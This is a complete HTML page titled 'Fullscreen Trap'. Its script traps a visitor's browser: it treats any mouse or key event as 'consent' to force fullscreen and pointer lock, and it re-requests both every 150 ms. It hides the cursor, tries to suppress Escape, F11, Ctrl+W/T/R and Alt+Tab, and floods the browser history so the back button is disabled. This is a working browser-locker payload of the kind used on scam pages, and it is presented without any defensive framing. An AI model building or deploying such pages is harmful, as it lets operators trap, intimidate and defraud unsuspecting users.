<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Fullscreen Trap</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  background: black;
  overflow: hidden;
  cursor: none;
  user-select: none;
  font-family: monospace;
}

#gestureLayer {
  position: fixed;
  inset: 0;
  z-index: 9999;
  background: rgba(0,0,0,0.01); /* invisible but clickable */
}
</style>
</head>
<body>

<div id="gestureLayer"></div>

<script>
const layer = document.getElementById("gestureLayer");

function requestFS() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
}

function lockPointer() {
  document.body.requestPointerLock?.();
}

function engage() {
  requestFS();
  lockPointer();
  layer.style.display = "none";
}

// Any interaction counts as consent
["mousedown","mouseup","mousemove","keydown","touchstart"].forEach(evt => {
  layer.addEventListener(evt, engage, { passive: false });
});

// If fullscreen drops, immediately demand a new gesture
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    layer.style.display = "block";
  }
});

// Extra pressure
setInterval(() => {
  requestFS();
  lockPointer();
}, 150);

// Block common exits (best effort)
document.addEventListener("keydown", e => {
  if (
    e.key === "Escape" ||
    e.key === "F11" ||
    (e.ctrlKey && ["w","W","t","T","r","R"].includes(e.key)) ||
    (e.altKey && e.key === "Tab")
  ) {
    e.preventDefault();
    e.stopPropagation();
  }
});

window.addEventListener("popstate", () => {
  history.pushState(null, "", location.href);
});

// Initial history flood
for (let i = 0; i < 40; i++) {
  history.pushState(null, "", location.href);
}
</script>

</body>
</html>
